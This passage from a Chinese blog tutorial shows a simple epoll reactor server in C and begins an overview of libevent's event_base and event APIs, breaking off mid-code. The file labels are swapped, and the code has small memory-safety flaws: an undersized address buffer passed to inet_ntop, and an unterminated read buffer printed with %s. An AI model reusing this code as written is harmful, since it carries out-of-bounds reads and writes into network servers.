href="#1-4-使用epoll实现一个简单的reactor模型" class="headerlink" title="1.4.使用epoll实现一个简单的reactor模型"></a>1.4.使用epoll实现一个简单的reactor模型</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//myreactor.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __MYREACTOR_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MYREACTOR_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_LEN 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EVENT 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> base;                               <span class="hljs-comment">//epoll的事件管理器</span><br>    <span class="hljs-type">int</span> max_event;                          <span class="hljs-comment">//最大监听的事件数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>[<span class="hljs-title">MAX_EVENT</span>];</span>   <span class="hljs-comment">//存储返回发生变化的事件</span><br>    <span class="hljs-type">int</span> timeout;                            <span class="hljs-comment">//监听的超时时间</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span>;</span>               <span class="hljs-comment">//事件管理器的指针</span><br>    <span class="hljs-type">int</span> fd;                                 <span class="hljs-comment">//监听的文件描述符</span><br>    <span class="hljs-type">short</span> event;                            <span class="hljs-comment">//监听的事件</span><br>    <span class="hljs-type">void</span> *arg;                              <span class="hljs-comment">//指向自己的结构体指针</span><br>    <span class="hljs-type">void</span> (*callback)(<span class="hljs-type">int</span>,<span class="hljs-type">short</span>,<span class="hljs-type">void</span>*);      <span class="hljs-comment">//回调函数</span><br>    <span class="hljs-type">int</span> status;                             <span class="hljs-comment">//状态</span><br>    <span class="hljs-type">char</span> buf[BUFFER_LEN];                   <span class="hljs-comment">//数据存储的缓冲区</span><br>    <span class="hljs-type">int</span> bufferlen;                          <span class="hljs-comment">//缓冲区数据的当前长度</span><br>&#125;;<br><span class="hljs-comment">//设置监听事件</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span>;       <span class="hljs-comment">//转换ip地址</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span>;      <span class="hljs-comment">//转换ip地址</span><br><span class="hljs-keyword">struct</span> myeventbase *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">(<span class="hljs-type">int</span> max_event,<span class="hljs-type">int</span> timeout)</span>;                                                           <span class="hljs-comment">//创建一个事件管理器</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span>;                                              <span class="hljs-comment">//销毁一个事件管理器</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span>;                                                  <span class="hljs-comment">//开始循环监听事件的发生</span><br><span class="hljs-keyword">struct</span> myevent *<span class="hljs-title function_">event_new</span><span class="hljs-params">()</span>;                                                                    <span class="hljs-comment">//创建一个事件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *event)</span>;                                                      <span class="hljs-comment">//销毁一个事件</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventset</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *arg,<span class="hljs-type">void</span> *callback)</span>;                          <span class="hljs-comment">//初始化一个事件对象</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventadd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span>;                     <span class="hljs-comment">//将监听的对象加入事件管理器</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventdel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span>;                     <span class="hljs-comment">//将监听的对象从事件管理器中移除</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//myreactor.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myreactor.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    addr_tmp-&gt;sin_port = htons(port);<br>    <span class="hljs-keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;convert ip failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    <span class="hljs-keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *port = ntohs(addr_tmp-&gt;sin_port);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">struct</span> myeventbase *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">(<span class="hljs-type">int</span> max_event,<span class="hljs-type">int</span> timeout)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span> =</span> (<span class="hljs-keyword">struct</span> myeventbase *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> myeventbase));<br>    base-&gt;base = epoll_create(<span class="hljs-number">10</span>);<br>    base-&gt;max_event = max_event;<br>    base-&gt;timeout = timeout;<br>    <span class="hljs-keyword">return</span> base;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> count = epoll_wait(base-&gt;base,base-&gt;events,MAX_EVENT,base-&gt;timeout);<br>        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;epoll wait expired!\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;count;i++)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">event</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)base-&gt;events[i].data.ptr;<br>            <span class="hljs-keyword">if</span>((event-&gt;event &amp; EPOLLIN )&amp;&amp; (base-&gt;events[i].events &amp; EPOLLIN))<br>            &#123;<br>                <span class="hljs-comment">//写事件发生</span><br>                event-&gt;callback(event-&gt;fd,event-&gt;event,event);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span><br>&#123;<br>    <span class="hljs-built_in">free</span>(base);<br>&#125;<br><span class="hljs-keyword">struct</span> myevent *<span class="hljs-title function_">event_new</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> myevent));<br>    <span class="hljs-keyword">return</span> myevent;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">event_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *event)</span><br>&#123;<br>    <span class="hljs-built_in">free</span>(event);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventset</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *arg,<span class="hljs-type">void</span> *callback)</span><br>&#123;<br>    myevent-&gt;fd = fd;<br>    myevent-&gt;arg = arg;<br>    myevent-&gt;callback = callback;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventadd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span><br>&#123;<br>    myevent-&gt;base = base;<br>    myevent-&gt;event = event;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>;</span><br>    events.data.ptr = (<span class="hljs-type">void</span> *)myevent;<br>    events.events = event;<br>    epoll_ctl(base-&gt;base,EPOLL_CTL_ADD,myevent-&gt;fd,&amp;events);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventdel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>;</span><br>    events.data.ptr = (<span class="hljs-type">void</span>*)myevent;<br>    events.events = event;<br>    epoll_ctl(base-&gt;base,EPOLL_CTL_DEL,myevent-&gt;fd,&amp;events);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myreactor.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EVENTS 100</span><br><span class="hljs-type">socklen_t</span> SOCKLEN = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr);<br><span class="hljs-type">int</span> <span class="hljs-title function_">NewSocket</span><span class="hljs-params">(<span class="hljs-type">char</span> *addr, <span class="hljs-type">char</span> *port, <span class="hljs-type">int</span> backlog)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">ADDR</span>;</span><br>    ADDR.sin_family = AF_INET;<br>    convertip_to_net(AF_INET, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;ADDR, addr, atoi(port));<br>    <span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-comment">//与客户端实际通信的函数</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">handler_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">short</span> event,<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)arg;<br>    <span class="hljs-type">int</span> ret = read(fd,myevent-&gt;buf,<span class="hljs-keyword">sizeof</span>(myevent-&gt;buf));<br>    <span class="hljs-keyword">if</span>(ret &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">newevent</span>;</span><br>        newevent.data.ptr = myevent;<br>        newevent.events = EPOLLIN;<br>        epoll_ctl(myevent-&gt;base-&gt;base,EPOLL_CTL_DEL,myevent-&gt;fd,&amp;newevent);<span class="hljs-comment">//将事件从红黑树中移除</span><br>        close(fd);<br>        event_destroy(myevent);                                             <span class="hljs-comment">//销毁事件</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv from client:%s&quot;</span>,myevent-&gt;buf);<br>        bzero(myevent-&gt;buf,ret);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//接受客户端连接的函数</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">accept_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client</span>;</span><br>    <span class="hljs-type">int</span> client_fd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);<br>    <span class="hljs-type">char</span> client_addr[<span class="hljs-number">15</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> client_port;<br>    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);<br>    <span class="hljs-comment">//创建一个新的事件,将新的事件加入到事件管理器</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">newevent</span> =</span> event_new();<br>    eventset(newevent,client_fd,(<span class="hljs-type">void</span> *)newevent,handler_cb);<br>    eventadd(myevent-&gt;base,newevent,EPOLLIN);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = NewSocket(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>],<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new socket error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-comment">//创建一个事件监听器</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span> =</span> event_base_new(<span class="hljs-number">100</span>,<span class="hljs-number">1000</span>*<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//创建一个新的事件</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> event_new();<br>    <span class="hljs-comment">//初始化事件</span><br>    eventset(myevent,fd,(<span class="hljs-type">void</span> *)myevent,accept_cb);<br>    <span class="hljs-comment">//将事件加入到监听队列</span><br>    eventadd(base,myevent,EPOLLIN);<br>    <span class="hljs-comment">//开始监听</span><br>    event_base_loop(base);<br>    <span class="hljs-comment">//销毁事件</span><br>    event_destroy(myevent);<br>    event_base_destroy(base);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-libevent"><a href="#2-libevent" class="headerlink" title="2.libevent"></a>2.libevent</h3><h4 id="2-1-什么是libevent"><a href="#2-1-什么是libevent" class="headerlink" title="2.1.什么是libevent?"></a>2.1.什么是libevent?</h4><p>Libevent 是一个用C语言编写的、轻量级的开源高性能事件通知库，主要有以下几个亮点：事件驱动（ event-driven），高性能;轻量级，专注于网络，不如 ACE 那么臃肿庞大；源代码相当精炼、易读；跨平台，支持 Windows、 Linux、 *BSD 和 Mac Os；支持多种 I&#x2F;O 多路复用技术， epoll、 poll、 dev&#x2F;poll、 select 和 kqueue 等；支持 I&#x2F;O，定时器和信号等事件；注册事件优先级。</p><h4 id="2-2-涉及到的基本数据类型以及api"><a href="#2-2-涉及到的基本数据类型以及api" class="headerlink" title="2.2.涉及到的基本数据类型以及api"></a>2.2.涉及到的基本数据类型以及api</h4><ul><li><p>1.event_base</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> event_base *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">()</span>;<span class="hljs-comment">//创建一个event_base</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//释放一个event_base</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_priority_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">int</span> n_priorities)</span>;<span class="hljs-comment">//为事件设置优先级,以后事件优先级可以从0到n_priorities,(0最高)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_reinit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//调用fork函数之后要重新初始化base,因此要使用此函数重新初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">int</span> flags)</span>;<span class="hljs-comment">//开始运行循环</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_dispatch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//同event_base_loop,只是flag没有设置</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loopexit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timeval *tv)</span>;<span class="hljs-comment">//让event_base在指定的时间之后停止循环</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loopbreak</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base)</span>;<span class="hljs-comment">//让event_base立即停止循环</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_dump_events</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, FILE *f)</span>;<span class="hljs-comment">//将event_base的状态转存到文件中</span><br></code></pre></td></tr></table></figure></li><li><p>2.event</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_TIMEOUT      0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_READ         0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_WRITE        0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_SIGNAL       0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_PERSIST      0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_ET           0x20</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*event_callback_fn)</span><span class="hljs-params">(<span class="hljs-type">evutil_socket_t</span>, <span class="hljs-type">short</span>, <span class="hljs-type">void</span> *)</span>;<span class="hljs-comment">//触发事件调用的回调函数类型</span><br><br><span class="hljs-keyword">struct</span> event *<span class="hljs-title function_">event_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, <span class="hljs-type">evutil_socket_t</span> fd,</span><br><span class="hljs-params">    <span class="hljs-type">short</span> what, event_callback_fn cb,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *arg)</span>;<span class="hljs-comment">//创建一个新的event</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event *event)</span>;<span class="hljs-comment">//释放一个新的event</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_priority_set</span><span class="hljs-params">(<span 